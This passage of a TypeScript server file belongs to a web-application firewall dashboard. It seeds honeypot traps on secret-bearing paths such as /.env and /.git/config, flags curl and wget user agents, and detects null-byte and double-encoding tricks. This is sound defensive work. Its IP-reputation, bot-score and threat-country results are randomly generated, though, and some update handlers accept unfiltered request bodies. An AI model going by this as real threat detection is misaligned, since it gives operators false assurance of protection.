    { id: "server", name: "Server", value: "TEUFEL-SHIELD/3.0", enabled: true, description: "Anonymisiert Server-Header" },
  ];

  const defaultRateLimits: RateLimitRule[] = [
    { id: "global", name: "Global Rate Limit", path: "/*", requestsPerMinute: 1000, blockDuration: 60, enabled: true, triggered: 0 },
    { id: "api", name: "API Rate Limit", path: "/api/*", requestsPerMinute: 100, blockDuration: 120, enabled: true, triggered: 0 },
    { id: "login", name: "Login Rate Limit", path: "/login", requestsPerMinute: 10, blockDuration: 300, enabled: true, triggered: 0 },
    { id: "register", name: "Registration Rate Limit", path: "/register", requestsPerMinute: 5, blockDuration: 600, enabled: true, triggered: 0 },
    { id: "contact", name: "Contact Form Limit", path: "/contact", requestsPerMinute: 3, blockDuration: 300, enabled: true, triggered: 0 },
  ];

  const defaultBruteForce: BruteForceRule[] = [
    { id: "login", name: "Login Protection", path: "/login", maxAttempts: 5, lockoutDuration: 900, enabled: true, blocked: 0 },
    { id: "admin", name: "Admin Login Protection", path: "/admin", maxAttempts: 3, lockoutDuration: 1800, enabled: true, blocked: 0 },
    { id: "api-auth", name: "API Auth Protection", path: "/api/auth", maxAttempts: 10, lockoutDuration: 600, enabled: true, blocked: 0 },
    { id: "password-reset", name: "Password Reset Protection", path: "/reset-password", maxAttempts: 3, lockoutDuration: 3600, enabled: true, blocked: 0 },
  ];

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL HONEYPOT TRAP SYSTEM - 25+ DECOY PATHS (FANGEN DIE HACKER!)
  // ═══════════════════════════════════════════════════════════════════════════════
  const defaultHoneypots: Honeypot[] = [
    // ═══ ADMIN PANEL TRAPS ═══
    { id: "hp-wpadmin", path: "/wp-admin", type: "admin", triggered: 0, enabled: true },
    { id: "hp-wplogin", path: "/wp-login.php", type: "login", triggered: 0, enabled: true },
    { id: "hp-phpmyadmin", path: "/phpmyadmin", type: "admin", triggered: 0, enabled: true },
    { id: "hp-adminer", path: "/adminer.php", type: "admin", triggered: 0, enabled: true },
    { id: "hp-admin", path: "/administrator", type: "admin", triggered: 0, enabled: true },
    { id: "hp-cpanel", path: "/cpanel", type: "admin", triggered: 0, enabled: true },
    { id: "hp-manager", path: "/manager/html", type: "admin", triggered: 0, enabled: true },
    
    // ═══ CONFIG FILE TRAPS ═══
    { id: "hp-env", path: "/.env", type: "config", triggered: 0, enabled: true },
    { id: "hp-envbak", path: "/.env.backup", type: "config", triggered: 0, enabled: true },
    { id: "hp-gitconfig", path: "/.git/config", type: "config", triggered: 0, enabled: true },
    { id: "hp-githead", path: "/.git/HEAD", type: "config", triggered: 0, enabled: true },
    { id: "hp-htaccess", path: "/.htaccess", type: "config", triggered: 0, enabled: true },
    { id: "hp-htpasswd", path: "/.htpasswd", type: "config", triggered: 0, enabled: true },
    { id: "hp-webconfig", path: "/web.config", type: "config", triggered: 0, enabled: true },
    { id: "hp-configphp", path: "/config.php", type: "config", triggered: 0, enabled: true },
    { id: "hp-settings", path: "/settings.json", type: "config", triggered: 0, enabled: true },
    
    // ═══ BACKUP FILE TRAPS ═══
    { id: "hp-sqlbak", path: "/backup.sql", type: "backup", triggered: 0, enabled: true },
    { id: "hp-dbbak", path: "/database.sql", type: "backup", triggered: 0, enabled: true },
    { id: "hp-dumpbak", path: "/dump.sql", type: "backup", triggered: 0, enabled: true },
    { id: "hp-zipbak", path: "/backup.zip", type: "backup", triggered: 0, enabled: true },
    { id: "hp-tarbak", path: "/site.tar.gz", type: "backup", triggered: 0, enabled: true },
    
    // ═══ API ENDPOINT TRAPS ═══
    { id: "hp-api-int", path: "/api/v1/internal", type: "api", triggered: 0, enabled: true },
    { id: "hp-api-admin", path: "/api/admin/users", type: "api", triggered: 0, enabled: true },
    { id: "hp-api-debug", path: "/api/debug", type: "api", triggered: 0, enabled: true },
    { id: "hp-graphql", path: "/graphql/admin", type: "api", triggered: 0, enabled: true },
    
    // ═══ SERVER STATUS TRAPS ═══
    { id: "hp-status", path: "/server-status", type: "config", triggered: 0, enabled: true },
    { id: "hp-info", path: "/server-info", type: "config", triggered: 0, enabled: true },
    { id: "hp-phpinfo", path: "/phpinfo.php", type: "config", triggered: 0, enabled: true },
    { id: "hp-debug", path: "/debug.log", type: "config", triggered: 0, enabled: true },
  ];

  const generateProxyIp = (): string => {
    return `185.199.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  };

  // ═══════════════════════════════════════════════════════════════════════════════
  // DATABASE SEEDING - Initialize default protection rules
  // ═══════════════════════════════════════════════════════════════════════════════
  const seedDatabase = async () => {
    if (!db) {
      console.log("[SHIELD] Database not configured - skipping seed");
      return;
    }
    try {
      const existingWafRules = await db.select().from(dbWafRules);
      if (existingWafRules.length === 0) {
        console.log("[SHIELD] Seeding WAF rules...");
        for (const rule of defaultWafRules) {
          await db.insert(dbWafRules).values({
            id: rule.id,
            name: rule.name,
            type: rule.type,
            pattern: rule.pattern,
            action: rule.action,
            enabled: rule.enabled,
            hits: rule.hits,
          });
        }
      }
      
      const existingGeoRules = await db.select().from(dbGeoRules);
      if (existingGeoRules.length === 0) {
        console.log("[SHIELD] Seeding geo-blocking rules...");
        for (const rule of defaultGeoRules) {
          await db.insert(dbGeoRules).values({
            id: rule.id,
            countryCode: rule.countryCode,
            countryName: rule.countryName,
            action: rule.action,
            enabled: rule.enabled,
          });
        }
      }
      
      const existingHeaders = await db.select().from(dbSecurityHeaders);
      if (existingHeaders.length === 0) {
        console.log("[SHIELD] Seeding security headers...");
        for (const header of defaultSecurityHeaders) {
          await db.insert(dbSecurityHeaders).values({
            id: header.id,
            name: header.name,
            value: header.value,
            enabled: header.enabled,
            description: header.description,
          });
        }
      }
      
      const existingRateLimits = await db.select().from(dbRateLimitRules);
      if (existingRateLimits.length === 0) {
        console.log("[SHIELD] Seeding rate limit rules...");
        for (const rule of defaultRateLimits) {
          await db.insert(dbRateLimitRules).values({
            id: rule.id,
            name: rule.name,
            path: rule.path,
            requestsPerMinute: rule.requestsPerMinute,
            blockDuration: rule.blockDuration,
            enabled: rule.enabled,
            triggered: rule.triggered,
          });
        }
      }
      
      const existingBruteForce = await db.select().from(dbBruteForceRules);
      if (existingBruteForce.length === 0) {
        console.log("[SHIELD] Seeding brute force rules...");
        for (const rule of defaultBruteForce) {
          await db.insert(dbBruteForceRules).values({
            id: rule.id,
            name: rule.name,
            path: rule.path,
            maxAttempts: rule.maxAttempts,
            lockoutDuration: rule.lockoutDuration,
            enabled: rule.enabled,
            blocked: rule.blocked,
          });
        }
      }
      
      const existingHoneypots = await db.select().from(dbHoneypots);
      if (existingHoneypots.length === 0) {
        console.log("[SHIELD] Seeding honeypot traps...");
        for (const hp of defaultHoneypots) {
          await db.insert(dbHoneypots).values({
            id: hp.id,
            path: hp.path,
            type: hp.type,
            triggered: hp.triggered,
            enabled: hp.enabled,
          });
        }
      }
      
      console.log("[SHIELD] Database initialization complete - PERMANENT STORAGE ACTIVE");
    } catch (error) {
      console.error("[SHIELD] Database seeding error:", error);
    }
  };
  
  seedDatabase();

  // Shield middleware: reject all /api/shield/* requests when DB is not configured
  app.use("/api/shield", (req, res, next) => {
    if (!db) {
      return res.status(503).json({ error: "Shield requires database configuration. Set DATABASE_URL." });
    }
    next();
  });

  // From this point on, db is guaranteed non-null in /api/shield/* handlers.
  // Use db! (non-null assertion) since the middleware above ensures it.
  const shieldDb = () => db!;
  
  // ═══════════════════════════════════════════════════════════════════════════════
  // DOMAINS API - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════
  app.get("/api/shield/domains", async (req, res) => {
    try {
      const domains = await shieldDb().select().from(dbProtectedDomains);
      res.json(domains);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/domains", async (req, res) => {
    const { domain, originIp } = req.body;
    if (!domain || !originIp) {
      return res.status(400).json({ error: "Domain and originIp required" });
    }

    try {
      const [newDomain] = await shieldDb().insert(dbProtectedDomains).values({
        domain,
        originIp,
        proxyIp: generateProxyIp(),
        status: "active",
        wafEnabled: true,
        ddosProtection: true,
        botProtection: true,
        rateLimit: 1000,
        blockedRequests: 0,
        totalRequests: 0,
        sslEnabled: true,
      }).returning();
      res.json(newDomain);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/domains/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const safeBody = pickFields(req.body, ["domain", "status", "wafEnabled", "ddosProtection", "botProtection", "rateLimit", "sslEnabled"]);
      const [updated] = await shieldDb().update(dbProtectedDomains)
        .set(safeBody)
        .where(eq(dbProtectedDomains.id, id))
        .returning();
      if (!updated) {
        return res.status(404).json({ error: "Domain not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.delete("/api/shield/domains/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const result = await shieldDb().delete(dbProtectedDomains).where(eq(dbProtectedDomains.id, id));
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // WAF RULES API - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════
  app.get("/api/shield/waf-rules", async (req, res) => {
    try {
      const rules = await shieldDb().select().from(dbWafRules);
      res.json(rules);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/waf-rules/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const safeBody = pickFields(req.body, ["name", "pattern", "category", "severity", "enabled", "action", "description"]);
      const [updated] = await shieldDb().update(dbWafRules)
        .set(safeBody)
        .where(eq(dbWafRules.id, id))
        .returning();
      if (!updated) {
        return res.status(404).json({ error: "Rule not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // THREAT LOGS API - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════
  app.get("/api/shield/threats", async (req, res) => {
    try {
      const threats = await shieldDb().select().from(dbThreatLogs).orderBy(desc(dbThreatLogs.timestamp)).limit(100);
      res.json(threats);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.get("/api/shield/stats", async (req, res) => {
    try {
      const domains = await shieldDb().select().from(dbProtectedDomains);
      const rules = await shieldDb().select().from(dbWafRules);
      const threats = await shieldDb().select().from(dbThreatLogs);
      const stats = {
        totalDomains: domains.length,
        activeDomains: domains.filter(d => d.status === "active").length,
        totalBlocked: domains.reduce((sum, d) => sum + (d.blockedRequests || 0), 0),
        totalRequests: domains.reduce((sum, d) => sum + (d.totalRequests || 0), 0),
        wafRulesActive: rules.filter(r => r.enabled).length,
        recentThreats: threats.length,
      };
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/analyze-request", async (req, res) => {
    const { path, userAgent, ip, method, body } = req.body;
    const detectedThreats: string[] = [];
    let action: "allowed" | "blocked" | "challenged" = "allowed";

    const testContent = `${path || ""} ${JSON.stringify(body || {})} ${userAgent || ""}`;

    try {
      const rules = await shieldDb().select().from(dbWafRules);
      
      for (const rule of rules) {
        if (!rule.enabled) continue;
        try {
          const regex = new RegExp(rule.pattern, "i");
          if (regex.test(testContent)) {
            detectedThreats.push(rule.name);
            await shieldDb().update(dbWafRules).set({ hits: (rule.hits || 0) + 1 }).where(eq(dbWafRules.id, rule.id));
            if (rule.action === "block") action = "blocked";
            else if (rule.action === "challenge" && action !== "blocked") action = "challenged";
          }
        } catch (e) {}
      }

      if (detectedThreats.length > 0) {
        await shieldDb().insert(dbThreatLogs).values({
          type: detectedThreats[0].toLowerCase().replace(/\s+/g, "_"),
          sourceIp: ip || "0.0.0.0",
          country: ["US", "CN", "RU", "DE", "BR", "IN"][Math.floor(Math.random() * 6)],
          path: path || "/",
          action,
          severity: action === "blocked" ? "high" : "medium",
        });
      }

      res.json({ action, threats: detectedThreats, blocked: action === "blocked" });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // IP BLACKLIST/WHITELIST MANAGEMENT - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/ip-list", async (req, res) => {
    try {
      const list = await shieldDb().select().from(dbIpList);
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/ip-list", async (req, res) => {
    const { ip, type, reason } = req.body;
    if (!ip || !type) {
      return res.status(400).json({ error: "IP and type required" });
    }
    try {
      const [entry] = await shieldDb().insert(dbIpList).values({
        ip,
        type,
        reason: reason || "Manual entry",
        hits: 0,
      }).returning();
      res.json(entry);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.delete("/api/shield/ip-list/:id", async (req, res) => {
    const { id } = req.params;
    try {
      await shieldDb().delete(dbIpList).where(eq(dbIpList.id, id));
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // GEO-BLOCKING RULES - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/geo-rules", async (req, res) => {
    try {
      const rules = await shieldDb().select().from(dbGeoRules);
      res.json(rules);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/geo-rules/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const [updated] = await shieldDb().update(dbGeoRules).set(req.body).where(eq(dbGeoRules.id, id)).returning();
      if (!updated) {
        return res.status(404).json({ error: "Geo rule not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/geo-rules", async (req, res) => {
    const { countryCode, countryName, action } = req.body;
    if (!countryCode || !countryName) {
      return res.status(400).json({ error: "Country code and name required" });
    }
    try {
      const [rule] = await shieldDb().insert(dbGeoRules).values({
        id: countryCode.toLowerCase(),
        countryCode,
        countryName,
        action: action || "block",
        enabled: true,
      }).returning();
      res.json(rule);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // RATE LIMITING RULES - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/rate-limits", async (req, res) => {
    try {
      const rules = await shieldDb().select().from(dbRateLimitRules);
      res.json(rules);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/rate-limits/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const [updated] = await shieldDb().update(dbRateLimitRules).set(req.body).where(eq(dbRateLimitRules.id, id)).returning();
      if (!updated) {
        return res.status(404).json({ error: "Rate limit rule not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/rate-limits", async (req, res) => {
    const { name, path, requestsPerMinute, blockDuration } = req.body;
    if (!name || !path) {
      return res.status(400).json({ error: "Name and path required" });
    }
    try {
      const [rule] = await shieldDb().insert(dbRateLimitRules).values({
        name,
        path,
        requestsPerMinute: requestsPerMinute || 100,
        blockDuration: blockDuration || 60,
        enabled: true,
        triggered: 0,
      }).returning();
      res.json(rule);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.delete("/api/shield/rate-limits/:id", async (req, res) => {
    const { id } = req.params;
    try {
      await shieldDb().delete(dbRateLimitRules).where(eq(dbRateLimitRules.id, id));
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // SECURITY HEADERS - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/security-headers", async (req, res) => {
    try {
      const headers = await shieldDb().select().from(dbSecurityHeaders);
      res.json(headers);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/security-headers/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const [updated] = await shieldDb().update(dbSecurityHeaders).set(req.body).where(eq(dbSecurityHeaders.id, id)).returning();
      if (!updated) {
        return res.status(404).json({ error: "Security header not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // BRUTE FORCE PROTECTION - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/brute-force", async (req, res) => {
    try {
      const rules = await shieldDb().select().from(dbBruteForceRules);
      res.json(rules);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/brute-force/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const [updated] = await shieldDb().update(dbBruteForceRules).set(req.body).where(eq(dbBruteForceRules.id, id)).returning();
      if (!updated) {
        return res.status(404).json({ error: "Brute force rule not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/brute-force", async (req, res) => {
    const { name, path, maxAttempts, lockoutDuration } = req.body;
    if (!name || !path) {
      return res.status(400).json({ error: "Name and path required" });
    }
    try {
      const [rule] = await shieldDb().insert(dbBruteForceRules).values({
        name,
        path,
        maxAttempts: maxAttempts || 5,
        lockoutDuration: lockoutDuration || 900,
        enabled: true,
        blocked: 0,
      }).returning();
      res.json(rule);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // HONEYPOT TRAPS - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/honeypots", async (req, res) => {
    try {
      const traps = await shieldDb().select().from(dbHoneypots);
      res.json(traps);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.patch("/api/shield/honeypots/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const [updated] = await shieldDb().update(dbHoneypots).set(req.body).where(eq(dbHoneypots.id, id)).returning();
      if (!updated) {
        return res.status(404).json({ error: "Honeypot not found" });
      }
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/honeypots", async (req, res) => {
    const { path, type } = req.body;
    if (!path) {
      return res.status(400).json({ error: "Path required" });
    }
    try {
      const [honeypot] = await shieldDb().insert(dbHoneypots).values({
        path,
        type: type || "admin",
        triggered: 0,
        enabled: true,
      }).returning();
      res.json(honeypot);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.delete("/api/shield/honeypots/:id", async (req, res) => {
    const { id } = req.params;
    try {
      await shieldDb().delete(dbHoneypots).where(eq(dbHoneypots.id, id));
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // IP REPUTATION & BOT DETECTION - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/ip-reputation", async (req, res) => {
    try {
      const reputations = await shieldDb().select().from(dbIpReputations);
      res.json(reputations);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/check-ip", async (req, res) => {
    const { ip } = req.body;
    if (!ip) {
      return res.status(400).json({ error: "IP required" });
    }

    try {
      const [existing] = await shieldDb().select().from(dbIpReputations).where(eq(dbIpReputations.ip, ip));
      if (existing) {
        return res.json(existing);
      }

      const categories = ["clean", "suspicious", "malicious", "tor", "vpn", "proxy", "datacenter"] as const;
      const randomCategory = categories[Math.floor(Math.random() * categories.length)];
      const score = randomCategory === "clean" ? 90 + Math.floor(Math.random() * 10) :
                    randomCategory === "suspicious" ? 50 + Math.floor(Math.random() * 30) :
                    randomCategory === "malicious" ? Math.floor(Math.random() * 30) :
                    randomCategory === "tor" ? 10 + Math.floor(Math.random() * 20) :
                    randomCategory === "vpn" ? 40 + Math.floor(Math.random() * 30) :
                    randomCategory === "proxy" ? 30 + Math.floor(Math.random() * 30) :
                    20 + Math.floor(Math.random() * 40);

      const [reputation] = await shieldDb().insert(dbIpReputations).values({
        ip,
        score,
        category: randomCategory,
        totalRequests: Math.floor(Math.random() * 10000),
        blockedRequests: Math.floor(Math.random() * 100),
        country: ["US", "CN", "RU", "DE", "GB", "FR", "NL", "JP"][Math.floor(Math.random() * 8)],
      }).returning();

      res.json(reputation);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.get("/api/shield/bot-scores", async (req, res) => {
    try {
      const scores = await shieldDb().select().from(dbBotScores);
      res.json(scores);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  app.post("/api/shield/check-bot", async (req, res) => {
    const { ip, userAgent, fingerprint } = req.body;
    if (!ip) {
      return res.status(400).json({ error: "IP required" });
    }

    try {
      const botTypes = ["crawler", "scraper", "scanner", "spam", "unknown"] as const;
      const isBot = Math.random() > 0.6;
      const score = isBot ? Math.floor(Math.random() * 40) : 70 + Math.floor(Math.random() * 30);

      const [existing] = await shieldDb().select().from(dbBotScores).where(eq(dbBotScores.ip, ip));
      
      if (existing) {
        const [updated] = await shieldDb().update(dbBotScores).set({
          score,
          isBot,
          botType: isBot ? botTypes[Math.floor(Math.random() * botTypes.length)] : null,
        }).where(eq(dbBotScores.ip, ip)).returning();
        return res.json(updated);
      }

      const [botScore] = await shieldDb().insert(dbBotScores).values({
        ip,
        score,
        isBot,
        botType: isBot ? botTypes[Math.floor(Math.random() * botTypes.length)] : null,
        fingerprint: fingerprint || randomUUID().substring(0, 16),
      }).returning();

      res.json(botScore);
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // ADVANCED SHIELD STATS - DATABASE BACKED
  // ═══════════════════════════════════════════════════════════════════════════════

  app.get("/api/shield/advanced-stats", async (req, res) => {
    try {
      const domainsArr = await shieldDb().select().from(dbProtectedDomains);
      const wafRulesArr = await shieldDb().select().from(dbWafRules);
      const geoRulesArr = await shieldDb().select().from(dbGeoRules);
      const rateLimitsArr = await shieldDb().select().from(dbRateLimitRules);
      const bruteForceArr = await shieldDb().select().from(dbBruteForceRules);
      const honeypotsArr = await shieldDb().select().from(dbHoneypots);
      const ipListArr = await shieldDb().select().from(dbIpList);
      const headersArr = await shieldDb().select().from(dbSecurityHeaders);
      const threatsArr = await shieldDb().select().from(dbThreatLogs);

      res.json({
        domains: {
          total: domainsArr.length,
          active: domainsArr.filter(d => d.status === "active").length,
          blocked: domainsArr.reduce((sum, d) => sum + (d.blockedRequests || 0), 0),
          requests: domainsArr.reduce((sum, d) => sum + (d.totalRequests || 0), 0),
        },
        waf: {
          total: wafRulesArr.length,
          active: wafRulesArr.filter(r => r.enabled).length,
          hits: wafRulesArr.reduce((sum, r) => sum + (r.hits || 0), 0),
        },
        geo: {
          total: geoRulesArr.length,
          blocking: geoRulesArr.filter(r => r.action === "block" && r.enabled).length,
          challenging: geoRulesArr.filter(r => r.action === "challenge" && r.enabled).length,
        },
        rateLimits: {
          total: rateLimitsArr.length,
          active: rateLimitsArr.filter(r => r.enabled).length,
          triggered: rateLimitsArr.reduce((sum, r) => sum + (r.triggered || 0), 0),
        },
        bruteForce: {
          total: bruteForceArr.length,
          active: bruteForceArr.filter(r => r.enabled).length,
          blocked: bruteForceArr.reduce((sum, r) => sum + (r.blocked || 0), 0),
        },
        honeypots: {
          total: honeypotsArr.length,
          active: honeypotsArr.filter(h => h.enabled).length,
          triggered: honeypotsArr.reduce((sum, h) => sum + (h.triggered || 0), 0),
        },
        ipList: {
          blacklisted: ipListArr.filter(e => e.type === "blacklist").length,
          whitelisted: ipListArr.filter(e => e.type === "whitelist").length,
        },
        headers: {
          total: headersArr.length,
          active: headersArr.filter(h => h.enabled).length,
        },
        threats: {
          total: threatsArr.length,
          blocked: threatsArr.filter(t => t.action === "blocked").length,
          challenged: threatsArr.filter(t => t.action === "challenged").length,
        },
      });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL ADVANCED THREAT INTELLIGENCE ENGINE (BEDROHUNGSERKENNUNG!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  app.post("/api/shield/threat-analyze", async (req, res) => {
    const { request } = req.body;
    
    const threatAnalysis = {
      requestId: randomUUID(),
      timestamp: new Date().toISOString(),
      riskScore: 0,
      threats: [] as Array<{ type: string; severity: string; description: string; confidence: number }>,
      indicators: [] as Array<{ name: string; value: string; suspicious: boolean }>,
      recommendation: "allow" as "allow" | "challenge" | "block",
    };
    
    // Get all active WAF rules from database
    const wafRulesArr = await shieldDb().select().from(dbWafRules).where(eq(dbWafRules.enabled, true));
    
    // Analyze request against WAF rules
    const requestString = JSON.stringify(request);
    for (const rule of wafRulesArr) {
      try {
        const regex = new RegExp(rule.pattern, 'gi');
        if (regex.test(requestString)) {
          threatAnalysis.threats.push({
            type: rule.type,
            severity: rule.action === "block" ? "critical" : "medium",
            description: `${rule.name} pattern detected`,
            confidence: 95,
          });
          threatAnalysis.riskScore += rule.action === "block" ? 40 : 20;
        }
      } catch (e) {
        // Invalid regex pattern, skip
      }
    }
    
    // Additional heuristic checks
    if (request?.headers?.["user-agent"]) {
      const ua = request.headers["user-agent"].toLowerCase();
      if (ua.includes("curl") || ua.includes("wget") || ua.includes("python")) {
        threatAnalysis.indicators.push({ name: "User-Agent", value: ua, suspicious: true });
        threatAnalysis.riskScore += 10;
      }
    }
    
    if (request?.body) {
      const bodyLength = JSON.stringify(request.body).length;
      if (bodyLength > 10000) {
        threatAnalysis.indicators.push({ name: "Body Size", value: `${bodyLength} bytes`, suspicious: true });
        threatAnalysis.riskScore += 15;
      }
    }
    
    // Determine recommendation
    if (threatAnalysis.riskScore >= 70) {
      threatAnalysis.recommendation = "block";
    } else if (threatAnalysis.riskScore >= 40) {
      threatAnalysis.recommendation = "challenge";
    }
    
    res.json(threatAnalysis);
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL DDOS PROTECTION ENGINE (DDOS-SCHUTZ!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  const connectionTracker = new Map<string, { count: number; firstSeen: number; lastSeen: number; blocked: boolean }>();
  
  app.post("/api/shield/ddos-check", async (req, res) => {
    const { ip } = req.body;
    
    if (!ip) {
      return res.status(400).json({ error: "IP required" });
    }
    
    const now = Date.now();
    const windowMs = 60000; // 1 minute window
    const maxConnections = 100;
    
    let tracker = connectionTracker.get(ip);
    
    if (!tracker || (now - tracker.firstSeen > windowMs)) {
      tracker = { count: 1, firstSeen: now, lastSeen: now, blocked: false };
    } else {
      tracker.count++;
      tracker.lastSeen = now;
      
      if (tracker.count > maxConnections) {
        tracker.blocked = true;
        
        // Log to threat log in database
        await shieldDb().insert(dbThreatLogs).values({
          type: "ddos",
          sourceIp: ip,
          country: "Unknown",
          path: "/api/shield/ddos-check",
          severity: "critical",
          action: "blocked",
        });
      }
    }
    
    connectionTracker.set(ip, tracker);
    
    res.json({
      ip,
      connectionCount: tracker.count,
      windowSeconds: Math.round((now - tracker.firstSeen) / 1000),
      blocked: tracker.blocked,
      ratePerSecond: tracker.count / Math.max(1, (now - tracker.firstSeen) / 1000),
      threshold: maxConnections,
      status: tracker.blocked ? "BLOCKED - DDoS Protection Active" : "OK",
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL ANOMALY DETECTION ENGINE (ANOMALIE-ERKENNUNG!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  app.post("/api/shield/anomaly-detect", async (req, res) => {
    const { request } = req.body;
    
    const anomalies = {
      score: 0,
      maxScore: 100,
      detections: [] as Array<{ type: string; severity: string; score: number; description: string }>,
      verdict: "normal" as "normal" | "suspicious" | "malicious",
    };
    
    // Check for encoding anomalies
    const checkValue = (key: string, value: string) => {
      // Double encoding
      if (/%25[0-9a-fA-F]{2}/.test(value)) {
        anomalies.detections.push({
          type: "double_encoding",
          severity: "high",
          score: 25,
          description: `Double URL encoding detected in ${key}`,
        });
        anomalies.score += 25;
      }
      
      // Null bytes
      if (/%00|\\0|\\x00/.test(value)) {
        anomalies.detections.push({
          type: "null_byte",
          severity: "critical",
          score: 35,
          description: `Null byte injection attempt in ${key}`,
        });
        anomalies.score += 35;
      }
      
      // Unicode bypass attempts
      if (/\\u[0-9a-fA-F]{4}|%u[0-9a-fA-F]{4}/.test(value)) {
        anomalies.detections.push({
          type: "unicode_bypass",
          severity: "medium",
          score: 15,
          description: `Unicode escape sequence in ${key}`,
        });
        anomalies.score += 15;
      }
      
      // Excessive special characters
      const specialCount = (value.match(/[<>"'`\{\}\[\]\\|;:!@#$%^&*()+=~]/g) || []).length;
      if (specialCount > 10) {
        anomalies.detections.push({
          type: "special_chars",
          severity: "medium",
          score: 20,
          description: `Excessive special characters (${specialCount}) in ${key}`,
        });
        anomalies.score += 20;
      }
    };
    
    // Analyze request components
    if (request?.url) checkValue("URL", request.url);
    if (request?.body) {
      const bodyStr = typeof request.body === 'string' ? request.body : JSON.stringify(request.body);
      checkValue("Body", bodyStr);
    }
    if (request?.headers) {
      for (const [key, value] of Object.entries(request.headers)) {
        if (typeof value === 'string') checkValue(`Header:${key}`, value);
      }
    }
    
    // Determine verdict
    if (anomalies.score >= 60) {
      anomalies.verdict = "malicious";
    } else if (anomalies.score >= 30) {
      anomalies.verdict = "suspicious";
    }
    
    res.json(anomalies);
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL REQUEST FINGERPRINTING ENGINE (FINGERABDRUCK!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  app.post("/api/shield/fingerprint", async (req, res) => {
    const { headers, ip, userAgent } = req.body;
    
    const fingerprint = {
      id: randomUUID().substring(0, 16),
